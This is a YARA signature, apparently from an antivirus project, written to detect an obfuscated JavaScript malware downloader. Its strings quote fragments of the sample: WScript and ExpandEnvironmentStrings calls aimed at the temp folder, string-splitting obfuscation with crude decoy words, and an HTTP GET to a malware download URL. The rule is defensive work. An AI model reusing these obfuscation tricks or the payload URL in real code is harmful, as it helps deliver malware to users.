rule sig_20160428_79f8f9df20ebaaeb291bbc0a97b0aca4 {
  meta:
    description = "datamaliciousorder - file 20160428_79f8f9df20ebaaeb291bbc0a97b0aca4.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "a4b9cb4249907c13819f52d64b1f49299b7d726a3c170142d9dfb313956b96a2"

  strings:
    $s1  = "function GngIzzZicFetAegProRue(IjcPrdJybKxbIglCitQbf){SmdXtfIvgBiwBzdTuwEdv[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function GngIzzZicFetAegProRue(IjcPrdJybKxbIglCitQbf){SmdXtfIvgBiwBzdTuwEdv[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function EmxQneIddRphDzsWdcNbm() {return SmdXtfIvgBiwBzdTuwEdv[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s4  = "function XwoCztGpoRhbHlyNpbQyx(MnoWajDwcKfdVsyOlxLuj, PmmMtbRlyEpzNrsQyiXvf){CsgBhdBxxGrlCqnEkzZqg = CsgBhdBxxGrlCqnEkzZqg * 1; " ascii
    $s5  = "return MnoWajDwcKfdVsyOlxLuj - PmmMtbRlyEpzNrsQyiXvf;};" fullword ascii
    $s6  = "var SmdXtfIvgBiwBzdTuwEdv = function EvrLtkOulYduKgxYajEge() {return WorTduAxtXwbOfvGbeEdf[BunBfhHdzOswOnoGesFqw](\"WScript\"+\"" ascii
    $s7  = "var SmdXtfIvgBiwBzdTuwEdv = function EvrLtkOulYduKgxYajEge() {return WorTduAxtXwbOfvGbeEdf[BunBfhHdzOswOnoGesFqw](\"WScript\"+\"" ascii
    $s8  = "var WorTduAxtXwbOfvGbeEdf = this[\"WScript\"];" fullword ascii
    $s9  = "function EmxQneIddRphDzsWdcNbm() {return SmdXtfIvgBiwBzdTuwEdv[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s10 = "function XwoCztGpoRhbHlyNpbQyx(MnoWajDwcKfdVsyOlxLuj, PmmMtbRlyEpzNrsQyiXvf){CsgBhdBxxGrlCqnEkzZqg = CsgBhdBxxGrlCqnEkzZqg * 1; " ascii
    $s11 = "if (GpnRtlKhxDbdYehWunCys[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s12 = "function FggUunQfaCpuAglHjxGrd(){return JhgSnhQbeCtkQqfMjpZfw + \"\";};" fullword ascii
    $s13 = "function XyrApuUmvFafFuiHstYhr() {return ((QxzKqtMwaXhoMvkIdhRgi == true) && (QxzKqtMwaXhoMvkIdhRgi == WrrFfyWnqXusWosXsmHju)) ?" ascii
    $s14 = "function XyrApuUmvFafFuiHstYhr() {return ((QxzKqtMwaXhoMvkIdhRgi == true) && (QxzKqtMwaXhoMvkIdhRgi == WrrFfyWnqXusWosXsmHju)) ?" ascii
    $s15 = "GpnRtlKhxDbdYehWunCys[AdoOcaRhmQfuMjbSphBih](\"G\" + \"ET\", \"http://sarsudexpert.ru/q2ikcxz\", false);" fullword ascii
    $s16 = "function DpfWzuPbwPneCeqPcjDmu(){return 23;};" fullword ascii
    $s17 = "var QxzKqtMwaXhoMvkIdhRgi = false;" fullword ascii
    $s18 = "function RncGnqFdlUpyQmaRozUtm(DycIqnOfuSdpNlxQjwYpi) {var JnbLupYptQcgTxwWvaEdw = (1, 2, 3, 4, 5, DycIqnOfuSdpNlxQjwYpi); retur" ascii
    $s19 = "XmqXveBszEvgFfiJbsWfn = true;" fullword ascii
    $s20 = "}while (JniXlyLioWrcSasLsaMst);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}